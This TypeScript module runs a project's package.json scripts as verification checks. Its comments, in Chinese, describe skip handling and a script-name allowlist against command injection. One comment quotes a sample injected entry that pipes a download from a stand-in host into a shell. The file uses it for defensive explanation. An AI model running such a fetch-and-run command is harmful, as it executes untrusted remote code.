import { execFile } from 'node:child_process';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import {
  parseJsonText,
  type CheckKind,
  type CheckRunResult,
  type CheckRunnerPort,
} from '@yuki-byte18/shared';

/** verifier 会跑的四种检查 */
type VerifiableKind = Exclude<CheckKind, 'recollect' | 'error-scan' | 'bundle-size'>;

export interface CheckRunnerAdapterOptions {
  /**
   * package.json 脚本名映射。默认即本仓库自己的脚本名
   * （`test` / `typecheck` / `lint` / `e2e`），换项目时在配置里覆盖。
   */
  scripts?: Partial<Record<VerifiableKind, string | null>>;
  /** 包管理器，默认 pnpm */
  packageManager?: 'pnpm' | 'npm' | 'yarn' | 'bun';
  /** 单次检查超时，默认 10 分钟 */
  timeoutMs?: number;
  /** 额外环境变量（CI=1 之类） */
  env?: Record<string, string>;
}

/**
 * 检查运行适配器。
 *
 * 硬约束 5：单测 / 类型检查 / lint / E2E 都是外部进程，只能在这里调用；
 * `core/verifier` 只认识 `CheckRunnerPort`。
 *
 * 三个关键行为：
 *
 * 1. **项目里没有这个 script 就是 `skipped`，不是 `failed`，也不是 `passed`。**
 *    很多前端项目没有 E2E。把它当失败会让每次优化都回滚，
 *    当通过则会在验证记录里留下一条假证据。跳过必须可区分（见 `CheckRunResult.skipped`）。
 * 2. **用 `--if-present`**：脚本缺失时 pnpm 直接返回 0 而不报错，
 *    因此判断"有没有这个脚本"必须自己读 package.json，不能靠退出码。
 * 3. **不用 shell**：`execFile` 直接拉起包管理器进程，
 *    避免把脚本名拼进命令行（项目名里一个空格就能变成命令注入）。
 */
export function createCheckRunnerAdapter(
  options: CheckRunnerAdapterOptions = {},
): CheckRunnerPort {
  const pm = resolveBinary(options.packageManager ?? 'pnpm');
  const timeout = options.timeoutMs ?? 10 * 60_000;

  /** 每个 cwd 只读一次 package.json */
  const scriptCache = new Map<string, Record<string, string>>();

  const scriptsOf = async (cwd: string): Promise<Record<string, string>> => {
    const cached = scriptCache.get(cwd);
    if (cached !== undefined) return cached;

    try {
      const text = await readFile(join(cwd, 'package.json'), 'utf8');
      const scripts = readScripts(parseJsonText(text));
      scriptCache.set(cwd, scripts);
      return scripts;
    } catch {
      // 没有 package.json（比如把 target 指向了别的目录）：视作"什么脚本都没有"
      scriptCache.set(cwd, {});
      return {};
    }
  };

  return {
    async run(kind: VerifiableKind, cwd: string): Promise<CheckRunResult> {
      const scripts = await scriptsOf(cwd);
      const configured = options.scripts?.[kind];
      const scriptName = configured === undefined ? DEFAULT_SCRIPTS[kind] : configured;

      if (scriptName === null || scripts[scriptName] === undefined) {
        return {
          kind,
          // 跳过不等于失败：不该因为它回滚
          passed: true,
          skipped: true,
          durationMs: 0,
          output: `package.json 未定义 \`${scriptName ?? kind}\` 脚本，跳过该项检查`,
        };
      }

      const started = performance.now();

      /**
       * 脚本名先过白名单再决定能不能跑。
       *
       * Windows 上必须 `shell: true` 才能拉起 `.cmd`（Node 20 起对 `.cmd`/`.bat`
       * 直接 spawn 会抛 EINVAL），而一旦走 shell，脚本名就成了命令行的一部分。
       * 脚本名来自**被测项目**的 package.json —— 那是外部输入，
       * `"test": "x && curl evil.sh | sh"` 这种名字不该被我们拼进命令行。
       *
       * 只允许普通标识符：真实脚本名不会用到别的字符。
       */
      if (!SAFE_SCRIPT_NAME.test(scriptName)) {
        return {
          kind,
          passed: false,
          skipped: false,
          durationMs: Math.round(performance.now() - started),
          output: `脚本名 ${JSON.stringify(scriptName)} 含不安全字符，拒绝执行`,
        };
      }

      return new Promise<CheckRunResult>((resolve) => {
        execFile(
          pm,
          ['run', scriptName],
          {
            cwd,
            timeout,
            maxBuffer: 8 * 1024 * 1024,
            windowsHide: true,
            // 仅 Windows 需要：.cmd 必须经 shell 启动
            shell: process.platform === 'win32',
            // CI=1 让多数测试框架关掉交互式输出
            env: { ...process.env, CI: '1', ...options.env },
          },
          (err, stdout, stderr) => {
            const durationMs = Math.round(performance.now() - started);
            const combined = [stdout, stderr].filter((s) => s !== '').join('\n');

            if (err === null) {
              resolve({ kind, passed: true, skipped: false, durationMs, output: tail(combined) });
              return;
            }

            resolve({
              kind,
              passed: false,
              skipped: false,
              durationMs,
              output: tail(`${describeFailure(err)}\n${combined}`),
            });
          },
        );
      });
    },
  };
}

const DEFAULT_SCRIPTS: Record<VerifiableKind, string> = {
  'unit-test': 'test',
  'type-check': 'typecheck',
  lint: 'lint',
  e2e: 'e2e',
  // 验证阶段的第一个检查：见 verifier 里对 DEFAULT_CHECK_KINDS 的说明 ——
  // 不重新构建，重采集测到的就是改动前的产物
  build: 'build',
};

/**
 * Windows 上包管理器是 `.cmd` 批处理，而 `execFile` **不做 PATHEXT 解析** ——
 * 直接 spawn `pnpm` 会得到 ENOENT，表现为「所有检查都跑不起来」。
 * 补上扩展名后再配合 `shell: true`，才能真的把 `pnpm run <script>` 拉起来。
 */
function resolveBinary(pm: string): string {
  if (process.platform !== 'win32') return pm;
  if (pm.endsWith('.cmd') || pm.endsWith('.exe') || pm.endsWith('.bat')) return pm;
  return `${pm}.cmd`;
}

/**
 * 允许的脚本名形状。
 *
 * Windows 上必须走 shell（见 run 里的说明），因此这个名字会被拼进命令行；
 * 它来自被测项目的 package.json，不能当成可信字符串。
 */
const SAFE_SCRIPT_NAME = /^[A-Za-z0-9:_.-]+$/;

/**
 * 从解析出来的 package.json 里取 `scripts`。
 *
 * 不直接 `as Record<string, string>`：package.json 是可以被别人写坏的
 * （`"scripts": "oops"`），那样 `scripts[name]` 会静默拿到 undefined，
 * 于是每一项检查都被判成"没有这个脚本"—— 一个写错的文件能让整个验证层失效。
 */
function readScripts(parsed: unknown): Record<string, string> {
  if (typeof parsed !== 'object' || parsed === null) return {};
  const scripts = (parsed as { scripts?: unknown }).scripts;
  if (typeof scripts !== 'object' || scripts === null) return {};

  const result: Record<string, string> = {};
  for (const [name, value] of Object.entries(scripts as Record<string, unknown>)) {
    if (typeof value === 'string') result[name] = value;
  }
  return result;
}

/**
 * `execFile` 的错误形状。
 *
 * 显式写成 `| undefined`，而不是照抄 `NodeJS.ErrnoException`：
 * `exactOptionalPropertyTypes` 下 `code?: string` 与实际的
 * `code: string | number | null` 不兼容，直接标注会在调用处报 TS2379。
 */
interface ExecFailure {
  code?: string | number | null | undefined;
  path?: string | undefined;
  killed?: boolean | undefined;
}

function describeFailure(err: ExecFailure): string {
  if (err.killed === true) return '检查超时被终止';
  if (err.code === 'ENOENT') return `找不到可执行文件：${err.path ?? 'unknown'}`;
  return `退出码 ${err.code ?? 'unknown'}`;
}

/** 输出只保留尾部：测试框架的失败摘要总在最后 */
function tail(text: string, limit = 4_000): string {
  const trimmed = text.trim();
  return trimmed.length > limit ? `…（已截断）\n${trimmed.slice(-limit)}` : trimmed;
}
